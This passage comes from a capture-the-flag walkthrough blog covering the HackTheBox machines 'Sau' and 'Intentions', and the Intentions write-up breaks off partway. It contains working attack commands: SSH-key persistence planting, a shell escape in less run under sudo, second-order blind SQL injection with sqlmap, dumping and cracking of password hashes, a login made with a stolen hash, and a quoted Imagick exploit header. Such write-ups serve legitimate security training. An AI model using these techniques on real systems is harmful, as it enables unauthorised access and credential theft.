ssh-keygen -t rsa -b 2048 [output to ./id_rsa and used passphrase &#34;password&#34;] chmod 700 id_rsa base64 -w 0 id_rsa.pub &gt; id_rsa.pub64 cat id_rsa.pub64 [copy the output to clipboard] On the target box, as puma:
mkdir -p ~/.ssh echo &#34;[paste the id_rsa.pub64 contents]&#34; | base64 -d &gt;&gt; ~/.ssh/authorized_keys Then, back on the attacker box, use SSH and the generated key to log in as puma:
ssh -i id_rsa puma@10.10.11.224 Great! Now we have a fully-interactive shell and a persistent way to get back in (without needing the exploit / command injection).
User: puma Now, I&rsquo;ll enumerate the user. As always, in an effort to keep the walkthrough brief, I&rsquo;ll just show the notable results of user enumeration. To learn more about the details of my enumeration strategy, please read through this page.
puma and root are the main users on the box. Only puma has a home directory.
puma can sudo a certain service:
User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service puma holds the user flag
netstat -tulpn showed a very odd entry: 🚩
(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:8338 0.0.0.0:* LISTEN 888/python3 tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::55555 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - The puma user already has access to the flag, just cat it out for the points (pun intended):
cat ~/user.txt Port 8338 Investigating port 8338 was a very short rabbit-hole. Contacting the port internally with netcat reveals it is running HTTP. Subsequently using cURL on the port shows a simple website with a few links. One thing is notable: a link to a public Google Sheets document. Arriving at this document reveals hundreds of messages from other HTB players, many of which state that this is not part of the box.
In my opinion, I saw this as kind of a hiker&rsquo;s inuksuk: a way to leave your mark along a difficult path to say &ldquo;I was here&rdquo;. Go ahead and leave a tag, then get back to the rest of the box.
ROOT FLAG trail.service During user enumeration for puma, running sudo -l revealed that puma has sudo permissions for:
/usr/bin/systemctl status trail.service Running that command, this is the output. It appears to be a lot of Maltrail, which logs possible malicious http inputs to the server:
It looks like Maltrail logged several events, including my initial attempts at RCE and later, my creation of a reverse shell. Fun fact, it looks like it also logged someone else&rsquo;s reverse shell (that big base64 string further up decodes into a python reverse shell).
server.py To the reader: you may skip ahead to trail.service if you&rsquo;re short on time. This section turned out to be unimportant to the end result.
It&rsquo;s notable that trail.service has mention of the weird python process with pid 888: the one also seen with netstat during enumeration. I wonder if it&rsquo;s making python run? I&rsquo;ll try running the service while also running pspy (using tmux):
==&gt; Result: no, running the service did not cause server.py to run. It is already running.
Where is server.py? I&rsquo;ll go take a look at it:
find / -name &#34;server.py&#34; 2&gt;dev/null Oh! it&rsquo;s in /opt/maltrail 😱 This is the directory I was dropped into from the initial reverse shell! Now I feel foolish.
It looks like server.py mentions a config file:
At risk of stating the obvious: Knowing that the config file is an adjacent file, it&rsquo;s safe to assume that the maltrail config file is maltrail.config. Let&rsquo;s look inside:
That looks like a password hash that would be stored in something like /etc/shadow. And if so, it&rsquo;s for UID=0, aka root. The config file is even nice enough to specify the format of the hash. For copy-pasting sake, here it is again:
USERS admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0: # changeme! local:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:1000:192.168.0.0/16 # changeme! Since this clearly does not match /etc/passwd, I won&rsquo;t use unshadow for obtaining the password. Instead, I&rsquo;ll check to see which format in john would be best:
john --list=subformats | grep sha256 The winner is:
Format = dynamic_60 type = dynamic_60: sha256($p) Put the hash into a file, in the format that john recognizes, then run john with the specified format. Since this is HTB, it&rsquo;s safe to assume the password is in rockyou.txt:
echo &#34;admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc&#34; &gt; hash.txt WLIST=/usr/share/wordlists/rockyou.txt john --wordlist=$WLIST --format=dynamic_60 hash.txt In less than a second, the password was cracked:
Awesome! Thanks, John! 😂 Now that we have a (hopefully root) credential, let&rsquo;s try it with SSH:
ssh root@$RADDR ==&gt; Nope. Not the correct password. Too bad.
trail.service Perhaps the service itself is vulnerable? I&rsquo;ve already investigated its configuration. It runs python, but at a fixed/absolute path where puma does not have write access to. The service just opens up some logging.
Oh! OH&hellip; 😳 I should have realized this earlier, when I first ran it: running that service automatically opens the results in pager! For this box (and most systems) the pager is less. I was already familiar with this privilege escalation, but those unaware should check out this page of GTFObins for more detail (the very first entry on the page).
There is a convenience feature of less similar to several other full-screen programs that allows the user to run shell commands from within it by prefixing the command with a &lsquo;!&rsquo;. For example, !id:
🎉 From there, simply cat out the flag for those sweet root flag points! Congratulations.
EXTRA CREDIT: PWN To take it one step further, gain full root access by planting another SSH key. Generate a new SSH key as we did before:
ssh-keygen -t rsa -b 2048 [output to ./root_id_rsa and used passphrase &#34;password&#34;] chmod 700 id_rsa base64 -w 0 root_id_rsa.pub &gt; root_id_rsa.pub64 cat root_id_rsa.pub64 [copy the output to clipboard] Then use the same &ldquo;feature&rdquo; of less to plant the SSH key:
!echo &#34;[paste the contents of root_id_rsa.pub64]&#34; | base64 -d &gt;&gt; /root/.ssh/authorized_keys From the attacker box, use SSH to log in as root with the newly-generated key:
🕶️ There it is: full root access over SSH!
LESSONS LEARNED Attacker Once you know the application and version, spend a minute looking for known vulnerabilities. I spent far too long enumerating the box and the Requests-Basket API, reading through piles of javascript to get a feel for how the app worked. While it was mildly interesting, very little of that knowledge was useful in gaining a foothold for the box. Remember the filtered ports. In my typical port scan, the filtered ports don&rsquo;t show up individually - I only get a count of how many filtered ports were observed. I need to remember to go back and do another port scan if any filtered ports were detected. Read through the directory where your reverse shell opens. There&rsquo;s a higher likelihood of finding the vulnerability in or around a misconfigured application, so it should be top priority during enumeration. Full-screen console app? Check for ability to run shell commands. There are many examples of where this appears, including less, vim, ftp, mysql, etc. Many applications, especially older ones that came to popularity before multi-window systems, have some ability to run shell commands without leaving the application itself. If that application was run in a privileged process, those privileges are not dropped while within the application, leaving to an easy privesc. Defender Don&rsquo;t host things that are bound to be insecure. Providing a feature that allows an (untrusted) user to establish a forwarding url and to use that address to proxy traffic back to the user&hellip; that&rsquo;s just asking for it! If software like this is mission-critical, it would be better to externalize the risk and get an existing product like Burp or Postman. Use a package manager. Even internal software should be updated consistently. In my opinion, the big oversight on this box was running an outdated version of Maltrail. This software was &ldquo;installed&rdquo; simply by a scheduled process to clone a repo into /opt: the simpler (and more secure) way to do this is to use a package manager like apt. Better yet, use a snap and keep the process confined. Least-privilege is a rule to live by. There was no reason that puma needed to have sudo access to trail.service, especially if it was just to check the status. As pointed out in several places in maltrail.conf, log-checking could have relied on setting capabilities for the service, instead of excessive user privileges. `,url:"https://4wayhandshake.github.io/walkthrough/sau/"},"https://4wayhandshake.github.io/walkthrough/intentions/":{title:"Intentions",tags:["SQLi (Blind)","WAF","Broken API","Broken Authentication","Arbitrary Object Instantiation","Git","Plaintext Credentials","Credential Re-use","Chosen-plaintext Attack"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION Intentions was released on July 1, 2023 as the third box in Hackers Clash Open Beta Season II. It is a website that functions as an online image gallery. Users are also able to apply fancy effects to images within the gallery. This box comes with cute animals, food pics, and a painfully difficult foothold. Achieving the user flag after foothold is relatively straightforward but reinforces some good hacking fundamentals. The root flag is quick, but requires wrapping your head around some cryptography concepts and formulating a customized solution to overcome the problem.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 5000 -oN nmap/port-scan.txt $RADDR The results showed only ports 22 (SSH), and 80 (HTTP):
Nmap scan report for 10.10.11.220 Host is up (0.17s latency). Not shown: 65449 closed tcp ports (reset), 84 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http I followed up with a more detailed script scan on these ports:
nmap -sV -sC -n -Pn -p22,80 -oN nmap/extra-scan.txt $RADDR The results show a typical webserver running on port 80:
Nmap scan report for 10.10.11.220 Host is up (0.54s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 47d20066275ee69c808903b58f9e60e5 (ECDSA) |_ 256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Intentions |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Looks like just a typical nginx webserver and a recent version of OpenSSH.
Webserver Strategy Did banner-grabbing. Noticed the server is using nginx 1.18.0. Nothing else notable:
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Added intentions.htb to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.
echo &#34;$RADDR intentions.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac ffuf -w $WLIST -u http://FUZZ.$DOMAIN/ -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac There were no results from vhost or subdomain enumeration, so I proceeded with directory enumeration on http://intentions.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; feroxbuster -w $WLIST -u http://$DOMAIN -A -d 2 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,404,405 --output fuzzing/directory.json -E Directory enumeration gave the following:
It&rsquo;s probably worth checking out login.js and mdb.js. Also, there appears to be an admin dashboard.
Exploring the Website I took a quick look through the website. There is a registration tab and a login tab. Instead of attempting any bypass, I simply created a user:
/gallery is a web app with a photo gallery, where you can check your &ldquo;feed&rdquo; of images. The &ldquo;feed&rdquo; appears to be based entirely on which genres of images you subscribe to, defined in the Profile section of the web app:
&#x1f6a9; This might be something to pay attention to: why are the instructions so specific for formatting the genre list? It&rsquo;s possible that validation on this field is inadequate: I&rsquo;ll check back later. One thing to note though is that whenever I enter a list in a &quot;comma, separated, format&quot; the spaces get removed so that it is transformed to &quot;comma,separated,format&quot;
login.js, gallery.js, and mdb.js all appear to be minified. I tried running each of them through https://beautifier.io/ and reading through the code (mostly, just checking for interesting-looking strings). All I found was this snippet inside login.js showing an API address:
Since it looks like it&rsquo;ll be difficult to read the source code directly, I&rsquo;ll try using Burp to see what an update to the Genres field looks like.
But first, I&rsquo;ll enumerate the /js directory more deeply and see if there is more than just those three files:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$RADDR/js/FUZZ -t 80 -c -timeout 4 -v -e .js The results are:
app.js login.js (checked already) admin.js gallery.js (checked already) mdb.js (checked already) Testing the Genres Field I tried several different strings of increasing levels of weirdness. For example, I tried &ldquo;animals,food&rdquo;, &ldquo;animals,bugs&rdquo;, &ldquo;,animals&rdquo;, &ldquo;,bugs&rdquo;, &ldquo;,,,,&rdquo;, &ldquo;&rdquo;, and several more things. I also tried submitting a bunch of characters that may parse into a template or SQL injection:
The response is still &quot;status&quot; : &quot;success&quot;. This got me wondering how the genres value might be being used. The value seems to be POSTed to the /api/v1/gallery/user/genres endpoint, so there&rsquo;s a good chance it&rsquo;s being stored in a database somewhere.
To investigate, I checked my localstorage, cookies, etc. to see if the value was stored client side. Unsurprisingly, it is not. Since the genres value is being fetched and displayed on the profiles page, it must be stored server-side. As indicated by my previous tests of sending garbage values as the genre, the field must also be properly escaped as a string as it is received. But how can I make the server try to parse this genres field?
Simple! I&rsquo;ll try loading my &ldquo;Feed&rdquo;, which is organized according to the genres field. This is what a &ldquo;normal&rdquo; request for my feed looks like, using a valid genres field (containing &ldquo;animals,food&rdquo;):
But here&rsquo;s the result after trying a genres field full of symbols and other SQL / template junk, with genres set to &quot;')%*,.{{&amp;^}}
&#x1f44f; Excellent, we got a 500 Internal Server Error! One or more of those characters must be affecting the query that is used to load my &ldquo;Feed&rdquo;. I&rsquo;ll isolate which character is causing the error, by recursively dividing the character set in half and testing which half yields an error.
Test String 500 Status? &ldquo;&rsquo;)%*, Yes .{{&amp;^}} No &ldquo;') Yes %*, No &quot; No ' Yes ) No Ok, so the character causing the error is a singlequote. Let&rsquo;s see if we can insert extra junk that parses to SQL after one singlequote character. I tried setting genres to ' OR '1'='1 to close the quoted field then re-open it again. The result was a 200 status. This is pretty good evidence that we are dealing with some kind of SQL-based backend.
So to perform an SQL injection using the genres field, I&rsquo;d have to inject using POST /api/v1/gallery/user/genres and then evaluate the result of the injection using GET /api/v1/gallery/user/feed&hellip; This seems difficult to exploit, so I&rsquo;ll set it aside for now.
API Enumeration Wondering what other API endpoints might exist that could trigger parsing the genres field, I decided to enumerate the API. After all, I did directory enumeration on the regular site, but did not initially find the /api directory. Thankfully, we have two starting points:
POST /api/v1/gallery/user/genres GET /api/v1/gallery/user/feed First, I&rsquo;ll see if there are any additional endpoints within /api/v1/gallery/user:
ffuf -w $WLIST:FUZZ -u http://$RADDR/api/v1/gallery/user/FUZZ -t 80 -c -timeout 4 -v Nope, just found the two I already knew about. What about trying different API versions?
ffuf -w $WLIST:FUZZ -u http://$RADDR/api/FUZZ/gallery/user/feed -t 80 -c -timeout 4 -v Huh, interesting&hellip; there&rsquo;s a version 2 to the Gallery API. I&rsquo;ll check if it has the same two endpoints as v1:
ffuf -w $WLIST:FUZZ -u http://$RADDR/api/v2/gallery/user/FUZZ -t 80 -c -timeout 4 -v Yep, still just feed and genres. What about trying different values instead of user?
ffuf -w $WLIST:FUZZ -u http://$RADDR/api/v2/gallery/FUZZ -t 80 -c -timeout 4 -v Ok that&rsquo;s mildly interesting. There&rsquo;s an images directory. Here&rsquo;s a sample of requesting that URL:
It lists all of the images, their filenames, genres, and URLs. I also checked the v1 API and got the same result.
Now, there was another API endpoint that we&rsquo;ve already discovered: the one found by un-minifying login.js. That was /api/v1/auth/register. I&rsquo;ll try poking around that portion of the API as well:
ffuf -w $WLIST:FUZZ -u http://$RADDR/api/v1/auth/FUZZ -t 80 -c -timeout 4 -v I also tried the same enumeration using the version 2 API. Same results.
Whoa! OK that&rsquo;s much more interesting! Checking out that /user endpoint shows the user details. Note that this requires an auth token to access: attempting to cURL this endpoint without providing any extra data just yields a redirect back to the login page.
I wonder if it&rsquo;s possible to POST to that endpoint, hopefully to modify the user data? I&rsquo;ll use Burp to make a POST in the expected format. There are a lot of headers to include, so I&rsquo;ve assembled the POST using parts of the GET /api/v1/auth/user request and modifying it to be compliant with a POST:
The result is a 405 Method Not Allowed. Assuming the API is programmed sensibly, this is due to sending a POST to an endpoint that probably only responds to a GET. If it were down to having the wrong credential, it would probably be a 403 Forbidden or 401 Unauthorized.
I&rsquo;ll probably have to find a different way to set this &ldquo;admin&rdquo; bit to a 1. Perhaps I&rsquo;ll try again with the SQL injection.
SQL Injection The reason that performing SQL injection using the genres parameter seems so difficult is that the parameter must be injected at one URL, and then the result of the injection must be evaluated at a different URL. As it turns out, this isn&rsquo;t actually that abnormal - there&rsquo;s even a name for it: a second order SQL injection. After thoroughly reading through the SQLMap manual, I discovered that SQLMap actually has a set of options to use for exactly this scenario!
Following the instructions from the SQLMap manual pages, it looks like the best way to perform this SQL injection will be to save the two requests as files, and then input those request files to SQLMap. To generate the files, I proxied my interaction with the website (from the webapp&rsquo;s Your Profile and Your Feed sections) through Burp, then saved the requests to files using Burp Repeater:
I saved the two requests into files named post-genres and get-feed. From there, I proceeded with SQLMap:
sqlmap -r post-genres --second-req=get-feed SQLMap finished without finding anything, but gave the following feedback:
[WARNING] (custom) POST parameter &lsquo;JSON genres&rsquo; does not seem to be injectable [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &lsquo;&ndash;level&rsquo;/&rsquo;&ndash;risk&rsquo; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &lsquo;&ndash;tamper&rsquo; (e.g. &lsquo;&ndash;tamper=space2comment&rsquo;) and/or switch &lsquo;&ndash;random-agent&rsquo;
&#x1f914; Interesting that it mentions the WAF. After all, I&rsquo;ve already observed that this parameter gets modified between storage and recall: attempts at entering a &quot;comma, separated, format&quot; are transformed to &quot;comma,separated,format&quot;, so maybe it&rsquo;s removing the spaces from the genres field? I&rsquo;ll try that next, but first I&rsquo;ll try just dialing up the level and risk:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 Hmm, still no luck. Same message about the WAF though. I&rsquo;ll try using the tamper that they suggest. It seems like it might work.
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --tamper=space2comment Nice! Ok that worked a bit. Not only did SQLMap determine that the database is MySQL, it also found a technique that works!
--- Parameter: JSON genres ((custom) POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: {&#34;genres&#34;:&#34;a&#39;) OR NOT 2804=2804 AND (&#39;bVzP&#39;=&#39;bVzP&#34;} Vector: OR NOT [INFERENCE] --- I know that there is a rate-limiter on these requests, so I want to minimize my activity for enumerating the database: this time I&rsquo;ll specify the known parameters (database: MySQL, technique: boolean-based-blind) and start the database dump:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --tamper=space2comment --dbms=mysql --technique=B --dump I terminated the dump because it would have taken an extremely long time. So far, we know the following schema:
Database: intentions Tables: gallery_images, personal_access_tokens, migrations, users Those tables look quite interesting. I&rsquo;m most interested in users and personal_access_tokens, but migrations might also hold something valuable to explain the difference between API versions 1 and 2.
Table: users Let&rsquo;s first dump the whole table, to understand what fields it has:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --tamper=space2comment --dbms=mysql --technique=B --dump -D intentions -T users It looks like the fields are name, email, password, created_at, updated_at, admin and genres. That makes sense: it matches exactly what was found earlier at GET /api/v1/auth/user
First, I&rsquo;ll grab the name and password fields:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --dbms=mysql --technique=B --tamper=space2comment --dump -D intentions -T users -C name,password It took fooooreeeever, but I finally got a list of names and hashes. Here they are, assembled for cracking with hashcat later:
Camren Ullrich:$2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 Desmond Greenfelder:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 Dr. Chelsie Greenholt I:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W Eugene Okuneva I:$2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy Eula Shields:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 Florence Crona:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy greg:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m Jarrett Bayer:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS Jasen Mosciski:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW Jayson Strosin:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei Macy Walter:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm Madisyn Reinger DDS:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW Mariano Corwin:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya Melisa Runolfsson:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 Monique D&#39;Amore:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. Mr. Lucius Towne I:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae Mrs. Rhianna Hahn DDS:$2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma Mrs. Roxanne Raynor:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO Prof. Devan Ortiz DDS:$2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S Prof. Gina Brekke:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. Prof. Johanna Ullrich MD:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi Prof. Margret Von Jr.:$2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa Rose Rutherford:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m steve:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa Tod Casper:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou Viola Vandervort DVM:$2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa Zelda Jenkins:$2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 Immediately, something looks funny. Most of these people have ridiculous usernames, then there are two that are a single, short, anglo name: greg and steve. &#x1f468; &#x1f468;
I&rsquo;ll try getting more information on those two users.
First up, greg
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --dbms=mysql --technique=B --tamper=space2comment --dump -D intentions -T users -C name,email,password,admin --where=&#39;name=&#34;greg&#34;&#39; Here it is in tabular format, for copy-pasting:
Field Value name greg email greg@intentions.htb password $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m admin 1 Next, steve:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --dbms=mysql --technique=B --tamper=space2comment --dump -D intentions -T users -C name,email,password,admin --where=&#39;name=&#34;steve&#34;&#39; Field Value name steve email steve@intentions.htb password $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa admin 1 Alright, so both greg and steve are admin users. The $2y$10 at the beginning of the hashes reveal that they are bcrypt hashes created using 10 hashing rounds. For reference, that&rsquo;s Hashcat format 3200. That&rsquo;s pretty strong hashing, and a good way to store passwords. Since this is HTB, if these hashes are meant to be cracked then the passwords should be in Rockyou.
I copied the list of hashes above into a text file hashes.txt, then extracted just the hashes without the names (this is how hashcat expects them):
cut -d &#34;:&#34; -f 2 hashes.txt &gt; hashes-trimmed.txt Next, time to start up hashcat and get this going! Bcrypt is tough - this might take a while:
WLIST=/usr/share/wordlists/rockyou.txt hashcat -m 3200 hashes-trimmed.txt $WLIST --status --session=intentions &#x1f559; It&rsquo;s running at 3357 hashes per second. Estimated duration is 29h. I&rsquo;ll let this run for a while. Meanwhile, I&rsquo;ll investigate other leads I&rsquo;ve found.
Table: personal_access_tokens Again, I&rsquo;ll dump the whole table to understand what fields it has:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --dbms=mysql --technique=B --tamper=space2comment --dump -D intentions -T personal_access_tokens Oh, bummer! It&rsquo;s empty.
Table: migrations Again, I&rsquo;ll dump the whole table to understand what fields it has:
sqlmap -r post-genres --second-req=get-feed -vv --level 5 --risk 3 --dbms=mysql --technique=B --tamper=space2comment --dump -D intentions -T migrations Right now, this doesn&rsquo;t seem like usable information. I&rsquo;ll keep in in mind for later.
Back to enumeration (js directory) I had gotten a little sidetracked with the SQL injection - there were actually two .js files that I found in the /js directory enumeration that I have not yet examined: admin.js and app.js
Taking a look through admin.js reveals that it, like the other .js files, is minified. That&rsquo;s annoying, but after a quick visual scan of the document I realized there were big chunks of text in html at the bottom. I&rsquo;ve highlighted them in this screenshot:
That seems like valuable information! Here are some facts to glean from the text:
Legal Notice greg seems to have more authority than others greg set up a process with legal to transfer images directly to the server Traditionally, legal does not have tech experts. This may be an insecure process. TBD &#x1f6a9; v2 API Update v2 API is used for /admin it might have bugs The password is hashed client-side Bcrypt is the hashing algorithm there is an image-editing page, and it has some feature for applying effects. Ok, there&rsquo;s some progress! Since we already have the hashes, we just need to figure out how to use them to log in! I&rsquo;ll loop back to this momentarily. For completeness&rsquo;s sake, I&rsquo;ll also take a look at app.js
It is also minified. Once again, I ran it through https://beautifier.io/ to try to make some sense of it. Unfortunately, it was still quite hard to read. If I&rsquo;m desperate I&rsquo;ll return to reading the not-so-minified source code, but for now I have those juicy nuggets from within admin.js to investigate!
Bypassing Authentication The excerpt from admin.js revealed that hashing is done client-side. While this is a quick-and-dirty way to avoid the need to switch to HTTPS, it actually diminishes security if there is any risk of a database breach. Lucky for me, I already have the database contents, including all the password hashes. Let&rsquo;s see if it&rsquo;s possible to use those hashes to log in directly.
I tried proxying a login attempt through Burp. It looks like the password is still transmitted in plaintext though?
Taking a closer look, I realized that the login form is still using the v1 API. To fix this up, I tried logging in again using Burp Repeater, but this time for the POST /api/v2/auth/login endpoint. The results were not successful, but different from before:
{ &#34;status&#34;:&#34;error&#34;, &#34;errors&#34;:{ &#34;hash&#34;:[&#34;The hash field is required.&#34;] } } Ok nice, let&rsquo;s just try using a hash field instead of a password then, inputting greg&rsquo;s password hash directly:
SUCCESS!
Aaaand my instance died. I&rsquo;ll restart it and try this process again. This time, I won&rsquo;t do the Burp Repeater step, I&rsquo;ll just swap out the values from within Burp Proxy
Let&rsquo;s try that again. This time, I&rsquo;ll simply proxy the login request through Burp, modifying the following:
v1 &ndash;&gt; v2 &quot;password&quot; &ndash;&gt; &quot;hash&quot; The password value &ndash;&gt; greg&rsquo;s password hash And, we have success!
The admin page Now that I&rsquo;m logged in as greg, who has admin access, I should be able to finally get to the /admin page.
I&rsquo;ll take a look around the admin page and see what can be done. As seen earlier in admin.js, there is a link at the bottom of the v2 API Update news item:
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I&rsquo;ve included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: Image Feature Reference
That excerpt links to a PHP module called Imagick. A quick search with searchsploit revealed that there is an old exploit that involves this module: on kali it&rsquo;s at /usr/share/exploitdb/exploits/php/webapps/39766.php. From its description, it seems like it is able to un-restrict certain PHP functions, allowing them to run:
# Exploit Title: PHP Imagick disable_functions Bypass # Date: 2016-05-04 # Exploit Author: RicterZ (ricter@chaitin.com) # Vendor Homepage: https://pecl.php.net/package/imagick # Version: Imagick &lt;= 3.3.0 PHP &gt;= 5.4 # Test on: Ubuntu 12.04 # Exploit: &lt;?php # PHP Imagick disable_functions Bypass # Author: Ricter &lt;ricter@chaitin.com&gt; # # $ curl &#34;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&#34; # &lt;pre&gt; # Disable functions: exec,passthru,shell_exec,system,popen # Run command: cat /etc/passwd # ==================== # root:x:0:0:root:/root:/usr/local/bin/fish # daemon:x:1:1:daemon:/usr/sbin:/bin/sh # bin:x:2:2:bin:/bin:/bin/sh # sys:x:3:3:sys:/dev:/bin/sh # sync:x:4:65534:sync:/bin:/bin/sync # games:x:5:60:games:/usr/games:/bin/sh # ... # &lt;/pre&gt; Taking a look through the code, it seems like it is based on ImageTragik. In short, it looks like something you can use as a webshell if the PHP Imagick module is loaded, but functions like exec, passthru, shell_exec, etc are disabled. To use it, I&rsquo;d need to find a way to upload it to a webserver directory.
Moving on, there&rsquo;s the Users section. It seems to be reading directly from the Users table:
&#x1f4a1; Since we can control the genres field. It might be worth testing this for an SSTI. I&rsquo;ll check it out later.
Lastly, there&rsquo;s the Images section. We&rsquo;ve also seen all this data by using GET /api/v2/gallery/images (or v1. doesn&rsquo;t matter). The only difference is the Edit feature that was alluded-to by the News section:
The Edit feature allows you to apply one of four transforms to the image:
While that doesn&rsquo;t seem very useful, it does reveal that Imagick module is loaded. Also, further down the page we get some hints about the image files themselves:
While all that may seem unimportant, it points out one thing: /var/www/html/intentions/storage/app/public is mapped to /storage. There&rsquo;s a popular Nginx misconfiguration that I might be able to utilize by knowing that this mapping exists.
Ideas for what to look into
